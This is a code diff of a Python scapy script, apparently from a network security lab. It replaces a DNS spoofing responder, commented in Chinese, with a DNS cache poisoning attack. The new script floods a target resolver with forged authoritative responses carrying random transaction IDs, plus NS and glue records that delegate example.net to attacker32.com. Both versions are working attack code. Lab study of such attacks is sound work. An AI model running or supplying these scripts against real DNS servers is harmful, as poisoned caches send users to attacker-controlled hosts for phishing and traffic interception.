@@ -1,56 +1,104 @@
-#!/usr/bin/env python3
 from scapy.all import *
+import random
 import time
+import os
 
-def dns_spoof(pkt):
-    # 检查是否是目标DNS查询
-    if pkt.haslayer(DNSQR) and pkt[DNSQR].qname == b'www.hust-cse.com.':
-        print(f"[+] 收到DNS查询: {pkt[IP].src} -> {pkt[IP].dst}")
-        
-        # 构造欺骗的DNS响应
-        spoofed_ip = "20.21.9.1"
-        auth_ns = "ns.hust-cse.com"
-        auth_ns_ip = "20.24.4.9"
-        
-        # 构建DNS响应包
-        dns_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                      UDP(dport=pkt[UDP].sport, sport=53) / \
-                      DNS(
-                          id=pkt[DNS].id,
-                          qr=1,  # 响应
-                          aa=1,  # 权威回答
-                          qd=pkt[DNS].qd,
-                          an=DNSRR(
-                              rrname=pkt[DNSQR].qname,
-                              type='A',
-                              ttl=600,
-                              rdata=spoofed_ip
-                          ),
-                          ns=DNSRR(
-                              rrname="hust-cse.com.",
-                              type='NS',
-                              ttl=600,
-                              rdata=auth_ns
-                          ),
-                          ar=DNSRR(
-                              rrname=auth_ns + ".",
-                              type='A',
-                              ttl=600,
-                              rdata=auth_ns_ip
-                          )
-                      )
-        
-        print(f"[+] 发送欺骗响应: A记录={spoofed_ip}, NS记录={auth_ns}, 附加记录={auth_ns_ip}")
-        send(dns_response, verbose=0)
-        return f"Spoofed DNS Response sent for {pkt[DNSQR].qname}"
+# Attack Configuration
+TARGET_DNS_SERVER = "10.10.27.2"
+SPOOF_A_RECORD = ("www.example.net", "20.0.6.14")
+SPOOF_NS_RECORD = ("example.net", "attacker32.com")
+SPOOF_ADD_RECORD = ("attacker32.com", "20.0.8.27")
+TTL_VALUE = 86400  # Extended cache time (1 day)
+INTERFACE = "br-8f1148536672"  # Replace with actual docker bridge interface
+ATTACK_TIMES = 200  # Number of poisoning packets to send (probability attack)
 
-# 启动DNS欺骗
-print("[*] 启动DNS欺骗攻击...")
-print("[*] 目标域名: www.hust-cse.com")
-print("[*] 伪造A记录: 20.21.9.1")
-print("[*] 伪造NS记录: ns.hust-cse.com")
-print("[*] 伪造附加记录: 20.24.4.9")
-print("[*] 监听DNS流量...")
+def craft_dns_poison_packet():
+    # Generate random DNS ID (core of probability attack)
+    dns_id = random.randint(1, 65535)
+    
+    # Construct DNS Query Section (QD)
+    dns_qd = DNSQR(qname=SPOOF_A_RECORD[0], qtype="A", qclass="IN")
+    
+    # Construct Answer Section (A record)
+    ans_sec = DNSRR(
+        rrname=SPOOF_A_RECORD[0],
+        type="A",
+        ttl=TTL_VALUE,
+        rdata=SPOOF_A_RECORD[1],
+        rdlen=4
+    )
+    
+    # Construct Authority Section (NS record)
+    ns_sec = DNSRR(
+        rrname=SPOOF_NS_RECORD[0],
+        type="NS",
+        ttl=TTL_VALUE,
+        rdata=SPOOF_NS_RECORD[1]
+    )
+    
+    # Construct Additional Section (A record)
+    add_sec = DNSRR(
+        rrname=SPOOF_ADD_RECORD[0],
+        type="A",
+        ttl=TTL_VALUE,
+        rdata=SPOOF_ADD_RECORD[1],
+        rdlen=4
+    )
+    
+    # Construct full DNS packet
+    dns_pkt = DNS(
+        id=dns_id,
+        qd=dns_qd,
+        qr=1,
+        aa=1,
+        rd=0,
+        ra=1,
+        qdcount=1,
+        ancount=1,
+        nscount=1,
+        arcount=1,
+        an=ans_sec,
+        ns=ns_sec,
+        ar=add_sec
+    )
+    
+    # Construct IP + UDP packet
+    ip_pkt = IP(dst=TARGET_DNS_SERVER, src=SPOOF_ADD_RECORD[1])
+    udp_pkt = UDP(dport=53, sport=53)
+    
+    # Combine all layers
+    spoof_pkt = ip_pkt / udp_pkt / dns_pkt
+    return spoof_pkt
 
-# 监听DNS查询并响应
-sniff(filter="udp port 53 and host 10.10.27.2", prn=dns_spoof, store=0)
+def trigger_dns_query():
+    # Trigger DNS server to query target domain (improve attack success rate)
+    query_pkt = IP(dst=TARGET_DNS_SERVER) / UDP(dport=53) / DNS(
+        rd=1,
+        qd=DNSQR(qname=SPOOF_A_RECORD[0], qtype="A")
+    )
+    send(query_pkt, iface=INTERFACE, verbose=0)
+    print("Triggered DNS query to target DNS server")
+
+def dns_cache_poisoning():
+    # Check root privilege
+    if os.geteuid() != 0:
+        print("Error: Must run with root privileges (sudo python3 script.py)")
+        exit(1)
+    
+    # Trigger DNS query first
+    trigger_dns_query()
+    time.sleep(0.1)
+    
+    # Send poisoning packets (probability attack)
+    print(f"Starting DNS cache poisoning attack on {TARGET_DNS_SERVER}...")
+    for i in range(ATTACK_TIMES):
+        pkt = craft_dns_poison_packet()
+        send(pkt, iface=INTERFACE, verbose=0)
+        if (i+1) % 20 == 0:
+            print(f"Sent {i+1}/{ATTACK_TIMES} poisoning packets")
+        time.sleep(0.01)
+    
+    print("Attack completed! Verify DNS server cache now.")
+
+if __name__ == "__main__":
+    dns_cache_poisoning()
